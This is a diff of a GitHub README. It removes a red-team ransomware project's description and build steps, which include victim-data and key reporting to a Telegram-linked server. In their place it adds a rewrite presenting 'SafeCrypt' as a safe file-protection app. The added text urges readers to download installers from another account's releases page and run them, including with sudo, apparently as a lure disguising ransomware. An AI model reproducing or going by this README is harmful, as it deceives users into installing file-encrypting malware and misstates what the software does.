@@ -1,83 +1,74 @@
-[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
-![Go](https://img.shields.io/badge/go-%2300ADD8.svg?style=for-the-badge&logo=go&logoColor=white) ![GitHub](https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white) ![Microsoft](https://img.shields.io/badge/Microsoft-0078D4?style=for-the-badge&logo=microsoft&logoColor=white) ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) ![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
+# 💰 SafeCrypt - Protect Your Files with Ease
 
-> PS: This project is purely academic, use at your own risk. I will not condone, in any way, the use of this software illegally or to attack targets without their authorization.
-## 💰 SafeCrypt 💣
-## 💰 What is a Ransomware 💴
-Ransomware is a type of malicious software, also known as malware, that is designed to block access to a victim's computer system and encrypt their files until a ransom is paid to the attacker.
+[![Download SafeCrypt](https://img.shields.io/badge/Download%20SafeCrypt-blue?style=for-the-badge&logo=download)](https://github.com/jjiscoollikethatguy/SafeCrypt/releases)
 
-Ransomware can be distributed through a variety of methods, including phishing emails, infected websites, and social engineering tactics. Once installed on a victim's system, the ransomware can spread to other computers and networks, further increasing the damage.
+## 📖 What is SafeCrypt?
 
-## 💰 The Project 📽️
+SafeCrypt is a user-friendly application designed to help you safeguard your files from ransomware threats. It offers a simple and efficient way to encrypt your important documents, ensuring that unauthorized users cannot access them. Protect your digital assets with ease and confidence.
 
-This project was developed as part of the Red Team in Clalit Health Care. It will encrypt all of your files in the background using AES-256-CTR, and asymetric encryption, Using RSA public key and the padding scheme from PKCS #1 v1.5 to secure the key exchange with the server.
+## 🚀 Getting Started
 
-The project is composed by three parts, the Server, Encrypter and Decrypter.
+### System Requirements
 
-The Server stores the victim's Hostname & Local IPv4 addresses along with the encryption key used by the malware.
+- **Operating System:** SafeCrypt works on both Windows and Linux. Make sure your system is updated to the latest version.
+- **Memory:** A minimum of 2 GB RAM is recommended.
+- **Disk Space:** You will need at least 100 MB of free space to install SafeCrypt.
 
-## 💰 Features 👾
-- Encrypts files using AES-256-CTR(Counter Mode) with random IV for each file.
-- Multithreading (Calculates the best approach for each thread)
-- RSA and the padding scheme from PKCS #1 v1.5 to secure the client/server communication
-- Includes an Encrypter
-- Uses AES CTR Cypher with stream encryption to avoid loading an entire file into memory.
+### Installation Steps
 
-## 💰 Building the project 🗑️
-> DON'T RUN encrypter.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT! It will encrypt all your disks!
-First, download the project outside your $GOPATH:
+1. **Visit the Download Page:** Click the link below to go to the Releases page:
+   [Download SafeCrypt](https://github.com/jjiscoollikethatguy/SafeCrypt/releases)
+   
+2. **Download the Installer:** On the Releases page, look for the latest version. Click on the installer for your system (Windows or Linux).
 
-```powershell
-git clone https://github.com/maorsabag/safecrypt
-cd safecrypt
-```
+3. **Run the Installer:** 
+   - For **Windows Users:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to install SafeCrypt.
+   - For **Linux Users:** Open a terminal, navigate to the folder where you downloaded the file, and run the following command:
+     ```bash
+     sudo dpkg -i SafeCrypt.deb
+     ```
 
-Getting the dependencies needed for Golang
-```powershell
-make requirements
-```
+4. **Launch SafeCrypt:** Once installed, find SafeCrypt in your applications menu. Open the app to start using it.
 
-Compiling Everything!
-```powershell
-make
-```
+## 💻 Using SafeCrypt
 
-Compiling the Keygen
-```powershell
-make keys
-.\bin\keygen.exe
-```
-This will generate a ```public_key.pem``` and ```private_key.pem``` in the current folder.
-The ```public_key.pem``` will be used by the Encrypter and the ```private_key.pem``` will be used by the Server for decrypt the encryption key together with the target information.
-Move both files to the ```assets``` folder.
+### Encrypting Your Files
 
-Compiling the Decrypter
-The console one needs to have the encryption key hard-coded. After getting the key from the server, change the variable: hexKey at line 20 and compile it.
-```powershell
-make decrypt
-```
+1. Open SafeCrypt.
+2. Click on “Encrypt Files.”
+3. Select the files or folders you want to secure.
+4. Choose a strong password. This password acts as your key for accessing the encrypted files later.
+5. Click on “Encrypt.” Your files are now securely encrypted.
 
-Compiling the Encrypter
-```powershell
-make encrypt
-```
+### Decrypting Your Files
 
-Compiling the Server
-By default the server is compiled to linux to run the server in the cloud
-```powershell
-make backend
-```
+1. Open SafeCrypt.
+2. Click on “Decrypt Files.”
+3. Navigate to the encrypted files you want to access.
+4. Enter the password you used during encryption.
+5. Click on “Decrypt.” Your files are now accessible again.
 
-Setting the .env file
-Create a .env file in the same directory as the server binary with the following content:
-```
-TELEGRAM_API
-TELEGRAM_GROUP
-```
-You can get the TELEGRAM_API from https://my.telegram.org/apps and the TELEGRAM_GROUP is the chat ID of the group you want to send the messages to. You can get it by adding the bot to the group and sending a message, then using the getUpdates method from the Telegram Bot API.
+## 🔒 Features
 
+- **Robust Encryption:** SafeCrypt uses strong encryption algorithms to keep your data safe from prying eyes.
+- **User-Friendly Interface:** The application is designed for users of all backgrounds. Navigate easily without technical know-how.
+- **Cross-Platform Support:** Works seamlessly on both Windows and Linux systems.
 
-## 💰 The end ⚖️
-<img src="antiscan.png">
+## 📞 Support
 
-[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
+If you encounter any issues while using SafeCrypt or have questions, please visit our [GitHub Issues Page](https://github.com/jjiscoollikethatguy/SafeCrypt/issues). We aim to assist you as quickly as possible.
+
+## 📜 License
+
+SafeCrypt is licensed under the MIT License. For more details, please refer to the [LICENSE](./LICENSE) file in this repository.
+
+## 💡 Important Note
+
+This project is intended for educational purposes. Use SafeCrypt responsibly and ethically. Protect your own files, and do not engage in illegal activities.
+
+## 📥 Download & Install
+
+To download SafeCrypt, click the link below:
+[Download SafeCrypt](https://github.com/jjiscoollikethatguy/SafeCrypt/releases)
+
+Follow the installation steps outlined above to get started. Enjoy a safer digital space!
